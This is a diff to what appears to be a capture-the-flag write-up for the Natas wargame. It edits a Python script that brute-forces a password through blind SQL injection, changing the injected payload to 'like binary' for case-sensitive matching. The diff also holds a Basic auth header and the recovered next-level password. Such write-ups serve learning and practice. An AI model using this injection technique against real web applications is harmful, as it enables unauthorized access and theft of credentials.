@@ -36,20 +36,23 @@ HEADERS["Authorization"] = \
 "Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=="
 HEADERS["Content-Type"] = "application/x-www-form-urlencoded"
 
-# The template for the blind sql injection
-DATA = "username=natas16\" and password like \"________________________________\";#"
+# The template for the blind sql injection.
+# Note: operator 'like binary' is for case-sensitive (very important)
+DATA = "username=natas16\" and password like binary \"________________________________\";#"
 
 password = ""
 
 # Brute force on the password in O(n^2) when `n` is len(digits + ascii_letters)
 while(len(password) < 32):
+    # get the current index for brute force
     index = DATA.find("_")
+    
     for char in digits + ascii_letters:
-        
         # update the current char
         DATA = DATA[:index] + char + DATA[index+1:]
         response = post(url=URL, headers=HEADERS, data=DATA)
         
+        # check if the current letter is correct.
         if "This user exists" in response.text:
             password += char
             print("password: "+ password.ljust(32, "_"))
@@ -63,5 +66,5 @@ Output is:
 
 ## Password for the next level:
 ```
-trd7izrd5gatjj9pkpeuaolfejhqj32v
+TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
 ```
